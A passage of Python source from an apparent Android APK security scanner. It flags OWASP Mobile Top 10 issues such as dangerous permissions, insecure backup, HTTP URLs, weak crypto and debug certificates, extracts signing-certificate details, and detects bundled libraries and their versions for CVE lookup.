            custom_schemes = intent_filter_analysis.get("attack_surface_summary", {}).get("custom_uri_schemes", [])
            if custom_schemes:
                security_issues.append({
                    "category": "Attack Surface: Deep Links",
                    "severity": "medium",
                    "description": f"App registers {len(custom_schemes)} custom URI scheme(s): {', '.join(custom_schemes[:5])}",
                    "details": intent_filter_analysis["deep_links"][:5],
                    "recommendation": "Validate all data received via deep links to prevent injection attacks.",
                })
        
        for issue in network_config_analysis.get("security_issues", []):
            security_issues.append({
                "category": "M3: Network Security",
                "severity": "medium",
                "description": issue,
                "recommendation": "Configure network_security_config.xml properly for secure communications.",
            })
        
        # 6. Generate Frida scripts for dynamic analysis
        dynamic_analysis = generate_frida_scripts(
            package_name=package_name,
            strings=strings,
            dex_analysis=dex_analysis,
            permissions=permissions,
            urls=urls,
            smali_analysis=smali_analysis
        )
        
        # 7. Analyze native libraries (.so files)
        native_analysis_result = analyze_native_libraries(file_path, native_libs)
        
        # 8. Calculate security hardening score
        hardening_score_result = calculate_hardening_score(
            package_name=package_name,
            permissions=permissions,
            components=components,
            certificate=certificate,
            strings=strings,
            urls=urls,
            min_sdk=min_sdk,
            target_sdk=target_sdk,
            debuggable=debuggable,
            allow_backup=allow_backup,
            dex_analysis=dex_analysis,
            network_config_analysis=network_config_analysis,
            native_analysis=native_analysis_result,
            security_issues=security_issues
        )
        
        # Add security issues from native analysis
        if native_analysis_result and native_analysis_result.get("risk_level") in ["high", "critical"]:
            native_issues = []
            for lib in native_analysis_result.get("libraries", []):
                if lib.get("has_anti_debug"):
                    native_issues.append(f"{lib['name']}: Anti-debugging detected")
                if lib.get("secrets_found"):
                    native_issues.append(f"{lib['name']}: {len(lib['secrets_found'])} potential secrets")
            
            if native_issues:
                security_issues.append({
                    "category": "Native Code Security",
                    "severity": native_analysis_result.get("risk_level", "medium"),
                    "description": f"Native library analysis found {len(native_issues)} security concerns",
                    "details": native_issues[:10],
                    "recommendation": "Review native code for hardcoded secrets and implement proper security measures.",
                })
        
        # 9. Data flow / taint analysis
        data_flow_result = None
        data_flow_dict = None
        try:
            data_flow_result = analyze_data_flow(file_path, package_name)
            data_flow_dict = dataflow_result_to_dict(data_flow_result)
            
            # Add data flow security issues
            if data_flow_result.critical_flows > 0:
                security_issues.append({
                    "category": "M2: Data Flow - Critical",
                    "severity": "critical",
                    "description": f"Found {data_flow_result.critical_flows} critical data flow paths (sensitive data to insecure sinks)",
                    "details": [
                        f"{p.source.source_type}  {p.sink.sink_type}: {p.description}"
                        for p in data_flow_result.data_flow_paths[:5]
                        if p.severity == "critical"
                    ],
                    "recommendation": "Review critical data flows. Ensure sensitive data is encrypted before transmission/storage.",
                })
            
            if data_flow_result.high_risk_flows > 0:
                security_issues.append({
                    "category": "M2: Data Flow - High Risk",
                    "severity": "high",
                    "description": f"Found {data_flow_result.high_risk_flows} high-risk data flow paths",
                    "details": [
                        f"{p.source.source_type}  {p.sink.sink_type}: {p.description}"
                        for p in data_flow_result.data_flow_paths[:5]
                        if p.severity == "high"
                    ],
                    "recommendation": "Validate and sanitize sensitive data before passing to external sinks.",
                })
            
            if data_flow_result.privacy_violations:
                security_issues.append({
                    "category": "Privacy Violation",
                    "severity": "high",
                    "description": f"Found {len(data_flow_result.privacy_violations)} potential privacy/GDPR violations",
                    "details": [v.get("description", "") for v in data_flow_result.privacy_violations[:5]],
                    "recommendation": "Review data handling practices. Ensure user consent for PII collection and transmission.",
                })
                
            logger.info(f"Data flow analysis complete: {data_flow_result.total_flows} flows found ({data_flow_result.critical_flows} critical)")
        except Exception as e:
            logger.warning(f"Data flow analysis failed: {e}")
            data_flow_dict = None
        
        return ApkAnalysisResult(
            filename=file_path.name,
            package_name=package_name,
            version_name=version_name,
            version_code=version_code,
            min_sdk=min_sdk,
            target_sdk=target_sdk,
            permissions=permissions,
            components=components,
            strings=strings[:300],
            secrets=secrets,
            urls=list(set(urls))[:100],
            native_libraries=native_libs,
            certificate=certificate,
            activities=list(activities),
            services=list(services),
            receivers=list(receivers),
            providers=list(providers),
            uses_features=list(uses_features),
            app_name=app_name,
            debuggable=debuggable,
            allow_backup=allow_backup,
            dex_analysis=dex_analysis,
            resource_analysis=resource_analysis,
            intent_filter_analysis=intent_filter_analysis,
            network_config_analysis=network_config_analysis,
            smali_analysis=smali_analysis,
            dynamic_analysis=dynamic_analysis,
            native_analysis=native_analysis_result,
            hardening_score=hardening_score_result,
            security_issues=security_issues,
            data_flow_analysis=data_flow_dict,
        )
        
    except Exception as e:
        logger.error(f"APK analysis with androguard failed: {e}")
        # Fallback to basic analysis
        return analyze_apk_basic(file_path)


def _is_main_activity(intent_filters: List[str]) -> bool:
    """Check if activity is the main launcher activity."""
    return "android.intent.action.MAIN" in intent_filters


def _check_debuggable(apk) -> bool:
    """Check if APK is debuggable."""
    try:
        # Try to get from manifest
        manifest_xml = apk.get_android_manifest_xml()
        if manifest_xml is not None:
            app_elem = manifest_xml.find('.//application')
            if app_elem is not None:
                debuggable = app_elem.get('{http://schemas.android.com/apk/res/android}debuggable')
                return debuggable == 'true'
    except:
        pass
    return False


def _check_allow_backup(apk) -> bool:
    """Check if APK allows backup (default is true)."""
    try:
        manifest_xml = apk.get_android_manifest_xml()
        if manifest_xml is not None:
            app_elem = manifest_xml.find('.//application')
            if app_elem is not None:
                allow_backup = app_elem.get('{http://schemas.android.com/apk/res/android}allowBackup')
                return allow_backup != 'false'  # Default is true
    except:
        pass
    return True  # Default


def extract_apk_certificate(apk) -> Optional[ApkCertificate]:
    """Extract certificate information from APK."""
    try:
        certs = apk.get_certificates()
        if not certs:
            return None
        
        cert = certs[0]  # Primary certificate
        
        # Get certificate details
        import hashlib
        from datetime import datetime
        
        # Get the raw certificate bytes
        cert_der = cert.public_bytes(encoding=None) if hasattr(cert, 'public_bytes') else None
        
        # Calculate fingerprints
        cert_bytes = cert.dump() if hasattr(cert, 'dump') else bytes(cert)
        sha256_fp = hashlib.sha256(cert_bytes).hexdigest().upper()
        sha1_fp = hashlib.sha1(cert_bytes).hexdigest().upper()
        md5_fp = hashlib.md5(cert_bytes).hexdigest().upper()
        
        # Format fingerprints with colons
        sha256_fp = ':'.join(sha256_fp[i:i+2] for i in range(0, len(sha256_fp), 2))
        sha1_fp = ':'.join(sha1_fp[i:i+2] for i in range(0, len(sha1_fp), 2))
        md5_fp = ':'.join(md5_fp[i:i+2] for i in range(0, len(md5_fp), 2))
        
        # Extract subject and issuer
        subject = str(cert.subject) if hasattr(cert, 'subject') else "Unknown"
        issuer = str(cert.issuer) if hasattr(cert, 'issuer') else "Unknown"
        serial = str(cert.serial_number) if hasattr(cert, 'serial_number') else "Unknown"
        
        # Validity dates
        valid_from = ""
        valid_until = ""
        is_expired = False
        
        if hasattr(cert, 'not_valid_before'):
            valid_from = str(cert.not_valid_before)
        if hasattr(cert, 'not_valid_after'):
            valid_until = str(cert.not_valid_after)
            try:
                expiry = cert.not_valid_after
                is_expired = datetime.now() > expiry if hasattr(expiry, '__gt__') else False
            except:
                pass
        
        # Check for debug certificate indicators
        is_debug = _is_debug_certificate(subject, issuer)
        
        # Check if self-signed
        is_self_signed = subject == issuer
        
        # Signature version
        sig_version = "v1"
        if apk.is_signed_v2():
            sig_version = "v2"
        if apk.is_signed_v3():
            sig_version = "v3"
        
        # Public key info
        pub_key_algo = None
        pub_key_bits = None
        if hasattr(cert, 'public_key'):
            pk = cert.public_key()
            if hasattr(pk, 'key_size'):
                pub_key_bits = pk.key_size
            pub_key_algo = type(pk).__name__.replace('_', ' ')
        
        return ApkCertificate(
            subject=subject,
            issuer=issuer,
            serial_number=serial,
            fingerprint_sha256=sha256_fp,
            fingerprint_sha1=sha1_fp,
            fingerprint_md5=md5_fp,
            valid_from=valid_from,
            valid_until=valid_until,
            is_debug_cert=is_debug,
            is_expired=is_expired,
            is_self_signed=is_self_signed,
            signature_version=sig_version,
            public_key_algorithm=pub_key_algo,
            public_key_bits=pub_key_bits,
        )
        
    except Exception as e:
        logger.warning(f"Failed to extract certificate: {e}")
        return None


def _is_debug_certificate(subject: str, issuer: str) -> bool:
    """Check if certificate appears to be a debug/development certificate."""
    debug_indicators = [
        "CN=Android Debug",
        "CN=Debug",
        "O=Android",
        "CN=unknown",
        "OU=Android",
    ]
    combined = (subject + issuer).lower()
    return any(ind.lower() in combined for ind in debug_indicators)


def analyze_apk_security_comprehensive(
    apk,
    package_name: str,
    permissions: List[ApkPermission],
    components: List[ApkComponent],
    certificate: Optional[ApkCertificate],
    strings: List[ExtractedString],
    urls: List[str],
    min_sdk: Optional[int],
    target_sdk: Optional[int],
    debuggable: bool,
    allow_backup: bool,
) -> List[Dict[str, Any]]:
    """Comprehensive security analysis based on OWASP Mobile Top 10."""
    issues = []
    
    # ========== M1: Improper Platform Usage ==========
    
    # Check for dangerous permissions
    dangerous_perms = [p for p in permissions if p.is_dangerous]
    if dangerous_perms:
        severity = "critical" if len(dangerous_perms) > 5 else "high"
        issues.append({
            "category": "M1: Dangerous Permissions",
            "severity": severity,
            "description": f"App requests {len(dangerous_perms)} dangerous permissions that could compromise user privacy",
            "details": [{"name": p.name, "description": p.description} for p in dangerous_perms],
            "recommendation": "Review each permission and remove unnecessary ones. Implement runtime permission requests.",
        })
    
    # Check for exported components without protection
    exported_unprotected = [c for c in components if c.is_exported and c.component_type != "activity"]
    if exported_unprotected:
        issues.append({
            "category": "M1: Exported Components",
            "severity": "high",
            "description": f"App has {len(exported_unprotected)} exported components (services/receivers/providers) accessible by other apps",
            "details": [{"name": c.name, "type": c.component_type} for c in exported_unprotected[:10]],
            "recommendation": "Add android:permission attribute or set android:exported=false for internal components.",
        })
    
    # ========== M2: Insecure Data Storage ==========
    
    # Check allowBackup
    if allow_backup:
        issues.append({
            "category": "M2: Insecure Backup",
            "severity": "medium",
            "description": "App allows data backup (android:allowBackup=true), which could expose sensitive data",
            "recommendation": "Set android:allowBackup=\"false\" or implement BackupAgent to control what gets backed up.",
        })
    
    # Check for hardcoded sensitive patterns
    sensitive_patterns = [s for s in strings if s.category in ["api_key", "password", "private_key"]]
    if sensitive_patterns:
        issues.append({
            "category": "M2: Hardcoded Secrets",
            "severity": "critical",
            "description": f"Found {len(sensitive_patterns)} potential hardcoded secrets in the APK",
            "details": [{"type": s.category, "preview": s.value[:30] + "..."} for s in sensitive_patterns[:5]],
            "recommendation": "Never hardcode secrets. Use Android Keystore or secure key management solutions.",
        })
    
    # Check for SharedPreferences patterns (potential insecure storage)
    shared_prefs = [s for s in strings if 'SharedPreferences' in s.value or 'getSharedPreferences' in s.value]
    if shared_prefs:
        issues.append({
            "category": "M2: SharedPreferences Usage",
            "severity": "low",
            "description": "App uses SharedPreferences - ensure sensitive data is encrypted",
            "recommendation": "Use EncryptedSharedPreferences from AndroidX Security library for sensitive data.",
        })
    
    # ========== M3: Insecure Communication ==========
    
    # Check for HTTP URLs
    http_urls = [u for u in urls if u.startswith('http://') and 'localhost' not in u and '127.0.0.1' not in u]
    if http_urls:
        issues.append({
            "category": "M3: Insecure Communication",
            "severity": "high",
            "description": f"App contains {len(http_urls)} insecure HTTP URLs instead of HTTPS",
            "details": http_urls[:10],
            "recommendation": "Use HTTPS for all network communication. Implement certificate pinning for sensitive connections.",
        })
    
    # Check for certificate pinning indicators
    pinning_patterns = ['certificatePinner', 'CertificatePinner', 'ssl_pinning', 'TrustManager']
    has_pinning = any(any(p in s.value for p in pinning_patterns) for s in strings)
    if not has_pinning and http_urls:
        issues.append({
            "category": "M3: No Certificate Pinning",
            "severity": "advisory",  # FIX #1: Heuristic check - not a vulnerability
            "is_advisory": True,
            "description": "No certificate pinning detected - app may be vulnerable to MITM attacks",
            "recommendation": "Implement certificate pinning using OkHttp CertificatePinner or Network Security Config.",
        })
    
    # ========== M4: Insecure Authentication ==========
    
    # Check for weak auth patterns
    weak_auth = [s for s in strings if any(w in s.value.lower() for w in ['password=', 'pwd=', 'basic auth', 'md5('])]
    if weak_auth:
        issues.append({
            "category": "M4: Weak Authentication",
            "severity": "high",
            "description": "Potential weak authentication patterns detected",
            "recommendation": "Use strong authentication mechanisms. Avoid storing passwords in plain text.",
        })
    
    # ========== M5: Insufficient Cryptography ==========
    
    # Check for weak crypto
    weak_crypto_patterns = ['DES', 'RC4', 'MD5', 'SHA1', 'ECB']
    weak_crypto = [s for s in strings if any(wc in s.value for wc in weak_crypto_patterns)]
    if weak_crypto:
        issues.append({
            "category": "M5: Weak Cryptography",
            "severity": "high",
            "description": "Potentially weak cryptographic algorithms detected (DES, RC4, MD5, SHA1, ECB mode)",
            "details": list(set([s.value[:50] for s in weak_crypto[:5]])),
            "recommendation": "Use AES-256-GCM for encryption, SHA-256+ for hashing, and avoid ECB mode.",
        })
    
    # ========== M6: Insecure Authorization ==========
    
    # Check for root detection bypass patterns
    root_patterns = ['isRooted', 'checkRoot', 'RootBeer', 'detectRoot', '/system/app/Superuser']
    has_root_detection = any(any(p in s.value for p in root_patterns) for s in strings)
    if not has_root_detection:
        issues.append({
            "category": "M6: No Root Detection",
            "severity": "advisory",  # FIX #1: Heuristic check - not a vulnerability
            "is_advisory": True,
            "description": "No root detection mechanism found - app may run on compromised devices",
            "recommendation": "Implement root detection to protect sensitive functionality on rooted devices.",
        })
    
    # ========== M7: Client Code Quality ==========
    
    # Check for debugging enabled
    if debuggable:
        issues.append({
            "category": "M7: Debuggable App",
            "severity": "critical",
            "description": "App is debuggable - allows attackers to attach debuggers and inspect/modify runtime",
            "recommendation": "Set android:debuggable=\"false\" in release builds.",
        })
    
    # Check target SDK version
    if target_sdk and target_sdk < 30:  # Android 11
        issues.append({
            "category": "M7: Outdated Target SDK",
            "severity": "medium",
            "description": f"App targets SDK {target_sdk} - missing security improvements from newer Android versions",
            "recommendation": f"Update targetSdkVersion to at least 33 (Android 13) to benefit from security enhancements.",
        })
    
    if min_sdk and min_sdk < 23:  # Android 6.0
        issues.append({
            "category": "M7: Low Minimum SDK",
            "severity": "medium",
            "description": f"App supports devices with SDK {min_sdk} - these lack important security features",
            "recommendation": "Consider raising minSdkVersion to 23+ for runtime permissions and better security.",
        })
    
    # ========== M8: Code Tampering ==========
    
    # Check for anti-tampering
    tamper_patterns = ['SafetyNet', 'Play Integrity', 'signature verification', 'checkSignature']
    has_tampering_protection = any(any(p in s.value for p in tamper_patterns) for s in strings)
    if not has_tampering_protection:
        issues.append({
            "category": "M8: No Tampering Protection",
            "severity": "advisory",  # FIX #1: Heuristic check - not a vulnerability
            "is_advisory": True,
            "description": "No code tampering protection detected",
            "recommendation": "Implement Play Integrity API or SafetyNet Attestation to detect tampered apps.",
        })
    
    # ========== M9: Reverse Engineering ==========
    
    # Check for obfuscation (ProGuard/R8/DexGuard)
    obfuscation_indicators = _detect_obfuscation(strings)
    if not obfuscation_indicators['is_obfuscated']:
        issues.append({
            "category": "M9: No Obfuscation",
            "severity": "advisory",  # FIX #1: Heuristic check - not a vulnerability
            "is_advisory": True,
            "description": "App does not appear to be obfuscated - code can be easily reverse engineered",
            "recommendation": "Enable R8/ProGuard minification and obfuscation for release builds.",
        })
    
    # ========== M10: Extraneous Functionality ==========
    
    # Check for logging
    log_patterns = ['Log.d(', 'Log.v(', 'Log.i(', 'System.out.print', 'console.log']
    has_logging = any(any(p in s.value for p in log_patterns) for s in strings)
    if has_logging:
        issues.append({
            "category": "M10: Debug Logging",
            "severity": "low",
            "description": "Debug logging statements detected - may leak sensitive information",
            "recommendation": "Remove or disable debug logging in release builds using BuildConfig.DEBUG checks.",
        })
    
    # Check certificate issues
    if certificate:
        if certificate.is_debug_cert:
            issues.append({
                "category": "Certificate: Debug Signing",
                "severity": "critical",
                "description": "App is signed with a debug certificate - not suitable for production",
                "recommendation": "Sign the app with a proper release keystore before distribution.",
            })
        
        if certificate.is_expired:
            issues.append({
                "category": "Certificate: Expired",
                "severity": "high",
                "description": "App signing certificate has expired",
                "recommendation": "Re-sign the app with a valid certificate.",
            })
        
        if certificate.signature_version == "v1":
            issues.append({
                "category": "Certificate: Legacy Signature",
                "severity": "medium",
                "description": "App only uses v1 signature scheme - vulnerable to Janus vulnerability (CVE-2017-13156)",
                "recommendation": "Enable v2 and v3 signature schemes for better security.",
            })
        
        if certificate.public_key_bits and certificate.public_key_bits < 2048:
            issues.append({
                "category": "Certificate: Weak Key",
                "severity": "high",
                "description": f"Certificate uses weak {certificate.public_key_bits}-bit key",
                "recommendation": "Use at least 2048-bit RSA or 256-bit ECDSA keys.",
            })
    
    # Sort by severity
    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    issues.sort(key=lambda x: severity_order.get(x["severity"], 4))
    
    return issues


def _detect_obfuscation(strings: List[ExtractedString]) -> Dict[str, Any]:
    """Detect if APK is obfuscated."""
    # Count single-letter class/method names
    single_letter_count = 0
    for s in strings:
        if len(s.value) == 1 and s.value.isalpha():
            single_letter_count += 1
    
    # Check for ProGuard/R8 patterns
    proguard_indicators = ['proguard', 'r8', '-keep', '-dontwarn']
    has_proguard = any(any(p in s.value.lower() for p in proguard_indicators) for s in strings)
    
    # Many single letter names = likely obfuscated
    is_obfuscated = single_letter_count > 50 or has_proguard
    
    return {
        "is_obfuscated": is_obfuscated,
        "single_letter_count": single_letter_count,
        "has_proguard_config": has_proguard,
    }


def analyze_apk_basic(file_path: Path) -> ApkAnalysisResult:
    """Basic APK analysis fallback when androguard is not available."""
    try:
        with zipfile.ZipFile(file_path, 'r') as apk:
            # Parse AndroidManifest.xml (basic parsing)
            manifest_data = extract_android_manifest(apk)
            
            # Extract strings from DEX files
            strings = []
            secrets = []
            urls = []
            
            for name in apk.namelist():
                if name.endswith('.dex'):
                    try:
                        dex_data = apk.read(name)
                        dex_strings = extract_strings(dex_data, min_length=6, max_strings=2000)
                        strings.extend(dex_strings)
                        
                        # Extract URLs
                        for s in dex_strings:
                            if s.category == "url":
                                urls.append(s.value)
                    except Exception as e:
                        logger.warning(f"Failed to extract strings from {name}: {e}")
            
            # Detect secrets
            secrets = detect_secrets_in_strings(strings)
            
            # Find native libraries
            native_libs = [n for n in apk.namelist() if n.startswith('lib/') and n.endswith('.so')]
            
            # Basic security analysis
            security_issues = analyze_apk_security(manifest_data, strings, urls)
            
            return ApkAnalysisResult(
                filename=file_path.name,
                package_name=manifest_data.get("package", "unknown"),
                version_name=manifest_data.get("version_name"),
                version_code=manifest_data.get("version_code"),
                min_sdk=manifest_data.get("min_sdk"),
                target_sdk=manifest_data.get("target_sdk"),
                permissions=manifest_data.get("permissions", []),
                components=manifest_data.get("components", []),
                strings=strings[:300],
                secrets=secrets,
                urls=list(set(urls))[:100],
                native_libraries=native_libs,
                certificate=None,  # Not available without androguard
                activities=[],
                services=[],
                receivers=[],
                providers=[],
                uses_features=[],
                app_name=None,
                debuggable=False,
                allow_backup=True,
                security_issues=security_issues,
            )
            
    except Exception as e:
        logger.error(f"APK analysis failed: {e}")
        return ApkAnalysisResult(
            filename=file_path.name,
            package_name="error",
            version_name=None,
            version_code=None,
            min_sdk=None,
            target_sdk=None,
            permissions=[],
            components=[],
            strings=[],
            secrets=[],
            urls=[],
            native_libraries=[],
            certificate=None,
            activities=[],
            services=[],
            receivers=[],
            providers=[],
            uses_features=[],
            app_name=None,
            debuggable=False,
            allow_backup=True,
            security_issues=[],
            error=str(e),
        )


def extract_android_manifest(apk: zipfile.ZipFile) -> Dict[str, Any]:
    """Extract and parse AndroidManifest.xml from APK."""
    result = {
        "package": "unknown",
        "permissions": [],
        "components": [],
    }
    
    try:
        # AndroidManifest.xml in APKs is in binary XML format
        # We need to decode it or use aapt/apktool
        # For now, extract what we can from strings
        
        manifest_binary = apk.read('AndroidManifest.xml')
        
        # Extract strings that look like permissions
        strings = extract_strings(manifest_binary, min_length=10)
        
        permissions = []
        for s in strings:
            if 'android.permission.' in s.value:
                perm_name = s.value
                if perm_name.startswith('android.permission.'):
                    is_dangerous = perm_name in DANGEROUS_PERMISSIONS
                    permissions.append(ApkPermission(
                        name=perm_name,
                        is_dangerous=is_dangerous,
                        description=DANGEROUS_PERMISSIONS.get(perm_name),
                    ))
        
        # Deduplicate permissions
        seen = set()
        unique_perms = []
        for p in permissions:
            if p.name not in seen:
                seen.add(p.name)
                unique_perms.append(p)
        
        result["permissions"] = unique_perms
        
        # Try to extract package name
        for s in strings:
            if '.' in s.value and not s.value.startswith('android.') and s.value.count('.') >= 2:
                # Looks like a package name
                if all(c.isalnum() or c in '._' for c in s.value):
                    result["package"] = s.value
                    break
        
    except Exception as e:
        logger.warning(f"Failed to parse AndroidManifest.xml: {e}")
    
    return result


# =============================================================================
# APK Dependency Extraction and CVE Lookup
# =============================================================================

# Known Android/Java library package prefixes mapped to Maven coordinates
KNOWN_ANDROID_LIBRARIES = {
    # Google/Android
    "com.google.android.gms": ("com.google.android.gms:play-services", "Maven"),
    "com.google.firebase": ("com.google.firebase:firebase-common", "Maven"),
    "com.google.gson": ("com.google.code.gson:gson", "Maven"),
    "com.google.guava": ("com.google.guava:guava", "Maven"),
    "com.google.protobuf": ("com.google.protobuf:protobuf-java", "Maven"),
    "com.google.crypto.tink": ("com.google.crypto.tink:tink-android", "Maven"),
    
    # Square libraries
    "com.squareup.okhttp3": ("com.squareup.okhttp3:okhttp", "Maven"),
    "com.squareup.okhttp": ("com.squareup.okhttp:okhttp", "Maven"),
    "com.squareup.retrofit2": ("com.squareup.retrofit2:retrofit", "Maven"),
    "com.squareup.retrofit": ("com.squareup.retrofit:retrofit", "Maven"),
    "com.squareup.picasso": ("com.squareup.picasso:picasso", "Maven"),
    "com.squareup.moshi": ("com.squareup.moshi:moshi", "Maven"),
    "com.squareup.leakcanary": ("com.squareup.leakcanary:leakcanary-android", "Maven"),
    
    # Apache
    "org.apache.http": ("org.apache.httpcomponents:httpclient", "Maven"),
    "org.apache.commons": ("org.apache.commons:commons-lang3", "Maven"),
    
    # Jackson
    "com.fasterxml.jackson": ("com.fasterxml.jackson.core:jackson-databind", "Maven"),
    
    # RxJava
    "io.reactivex.rxjava2": ("io.reactivex.rxjava2:rxjava", "Maven"),
    "io.reactivex.rxjava3": ("io.reactivex.rxjava3:rxjava", "Maven"),
    
    # Glide
    "com.bumptech.glide": ("com.github.bumptech.glide:glide", "Maven"),
    
    # Facebook
    "com.facebook.stetho": ("com.facebook.stetho:stetho", "Maven"),
    "com.facebook.fresco": ("com.facebook.fresco:fresco", "Maven"),
    
    # Dagger/Hilt
    "dagger.hilt": ("com.google.dagger:hilt-android", "Maven"),
    "dagger": ("com.google.dagger:dagger", "Maven"),
    
    # Room/Jetpack
    "androidx.room": ("androidx.room:room-runtime", "Maven"),
    "androidx.work": ("androidx.work:work-runtime", "Maven"),
    "androidx.navigation": ("androidx.navigation:navigation-runtime", "Maven"),
    "androidx.lifecycle": ("androidx.lifecycle:lifecycle-runtime", "Maven"),
    "androidx.paging": ("androidx.paging:paging-runtime", "Maven"),
    
    # Networking/Security
    "okio": ("com.squareup.okio:okio", "Maven"),
    "org.bouncycastle": ("org.bouncycastle:bcprov-jdk15on", "Maven"),
    "org.conscrypt": ("org.conscrypt:conscrypt-android", "Maven"),
    
    # Database
    "io.realm": ("io.realm:realm-android-library", "Maven"),
    "org.greenrobot": ("org.greenrobot:eventbus", "Maven"),
    
    # Logging
    "com.jakewharton.timber": ("com.jakewharton.timber:timber", "Maven"),
    "org.slf4j": ("org.slf4j:slf4j-api", "Maven"),
    
    # Testing (if in production APK - bad!)
    "org.junit": ("junit:junit", "Maven"),
    "org.mockito": ("org.mockito:mockito-core", "Maven"),
}

# High-risk libraries with known CVE history
HIGH_RISK_LIBRARIES = {
    "com.fasterxml.jackson": "Jackson - frequently has deserialization vulnerabilities",
    "org.apache.commons": "Apache Commons - check for specific component CVEs",
    "com.google.protobuf": "Protobuf - check for parsing vulnerabilities",
    "org.bouncycastle": "BouncyCastle - crypto library with periodic CVEs",
    "com.squareup.okhttp": "OkHttp - network library, check for TLS issues",
    "org.apache.http": "Apache HTTP - legacy library with multiple CVEs",
    "io.realm": "Realm - database with potential injection issues",
}


@dataclass
class ApkLibraryInfo:
    """Information about a library detected in APK."""
    package_prefix: str
    maven_coordinate: str
    ecosystem: str
    version: Optional[str]
    class_count: int
    is_high_risk: bool
    risk_reason: Optional[str]
    version_source: str = "unknown"  # FIX #2: Track how we got the version
    version_confidence: str = "low"  # FIX #2: low/medium/high based on source


def _extract_library_versions_from_apk(output_dir: Path) -> Dict[str, Dict[str, str]]:
    """
    FIX #2: Extract library versions from multiple sources in decompiled APK.
    
    Sources checked:
    1. META-INF/maven/**/pom.properties - most reliable
    2. META-INF/maven/**/pom.xml - fallback
    3. BuildConfig.java files - version constants
    4. build.gradle if present - dependency declarations
    
    Returns:
        Dict mapping library_name -> {"version": "x.y.z", "source": "pom.properties", "confidence": "high"}
    """
    versions = {}
    
    if not output_dir or not output_dir.exists():
        return versions
    
    # Source 1: pom.properties files (HIGH confidence)
    meta_inf = output_dir / "resources" / "META-INF"
    if meta_inf.exists():
        for pom_props in meta_inf.rglob("pom.properties"):
            try:
                content = pom_props.read_text(encoding='utf-8', errors='ignore')
                artifact_id = None
                group_id = None
                version = None
                
                for line in content.split('\n'):
                    line = line.strip()
                    if line.startswith('groupId='):
                        group_id = line.split('=', 1)[1]
                    elif line.startswith('artifactId='):
                        artifact_id = line.split('=', 1)[1]
                    elif line.startswith('version='):
                        version = line.split('=', 1)[1]
                
                if group_id and artifact_id and version:
                    key = f"{group_id}:{artifact_id}"
                    versions[key] = {"version": version, "source": "pom.properties", "confidence": "high"}
                    # Also store with just group for matching
                    versions[group_id] = {"version": version, "source": "pom.properties", "confidence": "high"}
            except Exception as e:
                logger.debug(f"Failed to parse {pom_props}: {e}")
    
    # Source 2: pom.xml files (MEDIUM confidence - could be bundled)
    if meta_inf.exists():
        for pom_xml in meta_inf.rglob("pom.xml"):
            try:
                content = pom_xml.read_text(encoding='utf-8', errors='ignore')
                # Simple XML parsing for version
                group_match = re.search(r'<groupId>([^<]+)</groupId>', content)
                artifact_match = re.search(r'<artifactId>([^<]+)</artifactId>', content)
                version_match = re.search(r'<version>([^<]+)</version>', content)
                
                if group_match and artifact_match and version_match:
                    key = f"{group_match.group(1)}:{artifact_match.group(1)}"
                    if key not in versions:  # Don't overwrite higher confidence
                        versions[key] = {"version": version_match.group(1), "source": "pom.xml", "confidence": "medium"}
            except Exception as e:
                logger.debug(f"Failed to parse {pom_xml}: {e}")
    
    # Source 3: BuildConfig.java files (MEDIUM confidence)
    sources_dir = output_dir / "sources"
    if sources_dir.exists():
        for build_config in sources_dir.rglob("BuildConfig.java"):
            try:
                content = build_config.read_text(encoding='utf-8', errors='ignore')
                
                # Extract VERSION_NAME constant
                version_match = re.search(r'VERSION_NAME\s*=\s*["\']([^"\']+)["\']', content)
                package_match = re.search(r'package\s+([\w.]+);', content)
                
                if version_match and package_match:
                    package = package_match.group(1)
                    version = version_match.group(1)
                    if package not in versions:
                        versions[package] = {"version": version, "source": "BuildConfig", "confidence": "medium"}
            except Exception as e:
                logger.debug(f"Failed to parse {build_config}: {e}")
    
    # Source 4: build.gradle (HIGH confidence if found)
    gradle_files = list(output_dir.rglob("build.gradle")) + list(output_dir.rglob("build.gradle.kts"))
    for gradle_file in gradle_files[:5]:  # Limit to avoid processing too many
        try:
            content = gradle_file.read_text(encoding='utf-8', errors='ignore')
            # Match implementation 'group:artifact:version' or implementation("group:artifact:version")
            dep_patterns = [
                r"implementation\s*['\"]([^:]+):([^:]+):([^'\"]+)['\"]",
                r"api\s*['\"]([^:]+):([^:]+):([^'\"]+)['\"]",
                r"implementation\s*\(['\"]([^:]+):([^:]+):([^'\"]+)['\"]\)",
            ]
            for pattern in dep_patterns:
                for match in re.finditer(pattern, content):
                    group, artifact, version = match.groups()
                    key = f"{group}:{artifact}"
                    if key not in versions:
                        versions[key] = {"version": version, "source": "build.gradle", "confidence": "high"}
        except Exception as e:
            logger.debug(f"Failed to parse {gradle_file}: {e}")
    
    return versions


def extract_apk_dependencies(
    class_names: List[str],
    gradle_content: Optional[str] = None,
    output_dir: Optional[Path] = None  # FIX #2: Add output_dir for version extraction
) -> List[ApkLibraryInfo]:
    """
    Extract third-party library dependencies from APK.
    
    Detection methods:
    1. Class name prefixes matching known libraries
    2. Gradle file parsing if decompiled source available
    3. FIX #2: Version extraction from pom.properties, pom.xml, BuildConfig, gradle
    
    Args:
        class_names: List of class names from decompiled APK
        gradle_content: Optional build.gradle content if available
        output_dir: Optional JADX output directory for version extraction
        
    Returns:
        List of detected libraries with metadata and version confidence
    """
    libraries: Dict[str, ApkLibraryInfo] = {}
    
    # FIX #2: Extract versions from APK resources first
    version_info = {}
    if output_dir:
        version_info = _extract_library_versions_from_apk(Path(output_dir))
        logger.info(f"Extracted version info for {len(version_info)} libraries from APK")
    
    # Method 1: Detect from class names
    for class_name in class_names:
        for prefix, (maven_coord, ecosystem) in KNOWN_ANDROID_LIBRARIES.items():
            if class_name.startswith(prefix):
                if prefix not in libraries:
                    is_high_risk = prefix in HIGH_RISK_LIBRARIES
                    
                    # FIX #2: Try to find version from extracted info
                    version = None
                    version_source = "unknown"
                    version_confidence = "low"
                    
                    # Check various key formats
                    for key_to_try in [maven_coord, prefix, prefix.replace("/", ".")]:
                        if key_to_try in version_info:
                            version = version_info[key_to_try]["version"]
                            version_source = version_info[key_to_try]["source"]
                            version_confidence = version_info[key_to_try]["confidence"]
                            break
                    
                    libraries[prefix] = ApkLibraryInfo(
                        package_prefix=prefix,
                        maven_coordinate=maven_coord,
                        ecosystem=ecosystem,
                        version=version,
                        class_count=1,
                        is_high_risk=is_high_risk,
                        risk_reason=HIGH_RISK_LIBRARIES.get(prefix),
                        version_source=version_source,
                        version_confidence=version_confidence,
                    )
                else:
                    libraries[prefix].class_count += 1
                break
    
